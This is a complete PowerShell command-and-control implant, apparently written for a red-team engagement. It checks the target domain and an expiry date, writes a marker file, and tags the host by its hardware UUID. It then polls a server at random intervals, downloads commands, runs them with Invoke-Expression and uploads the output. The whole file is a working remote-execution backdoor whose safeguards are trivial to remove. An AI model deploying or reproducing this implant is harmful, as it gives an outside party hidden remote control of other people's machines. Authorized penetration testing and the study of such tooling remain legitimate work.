$server = "http://127.0.0.1:8080"
$pollmin = 1
$pollmax = 5
$timeout = 30
$terminationdate = Get-Date -Date "2020-01-01 00:00:00"
$targetdomain = "TARGETDOMAIN"
$markercontents = "If found, please contact XXX"
$markerlocation = "$env:USERPROFILE\marker.txt"

# Check domain matches 
if ($env:userdomain -notmatch $targetdomain) {
    Write-host "User domain does not match target domain"
    exit 1
}

# Check engagement window
if ((Get-Date)  -ge $terminationdate) {
    Write-host "Engagement window expired"
    exit 2
}

# Write a marker file	
$markercontents | Out-File $markerlocation

# Get UUID (will identify our victim)
$uuid = get-wmiobject Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID

while((Get-Date)  -lt $terminationdate)
{
    $output = ""

    # Sleep (with random time)
    $polltime = Get-Random -Minimum $pollmin -Maximum $pollmax
    sleep $polltime

    # Output a dot each time a request is made
    Write-Host "."

    # Get the current epoch time. Should stop responses being cached by intermediary devices like proxies.
    $time = [int64](([datetime]::UtcNow)-(get-date "1/1/1970")).TotalSeconds

    # Make the request and execute using IEX. Wrapped as a job to force a timeout after $timeout
    try {
        $command = (New-Object Net.WebClient).DownloadString("$server/c?i=$uuid&t=$time")
        try {
            if ($command) {
                $job = start-job -scriptblock {
                    param($c)
                    Invoke-Expression ($c) | out-string 
                } -Arg $command
                if (wait-job $job -Timeout $timeout) {
                    $output = receive-job $job
                }
                else {
                    $output = "Hard timeout received"
                    Remove-Job -force $job
                }
            }
        } 
        catch {
            $output = $_.Exception.message
        }
    
        if ($output) {
            # Send back the output or error
            Write-host "X"
            (New-Object Net.WebClient).UploadString("$server/r?i=$uuid&t=$time",$output)
        }
    }
    catch {
        Write-Host "~"
    }
}

Write-host "Engagement window expired"
exit 2
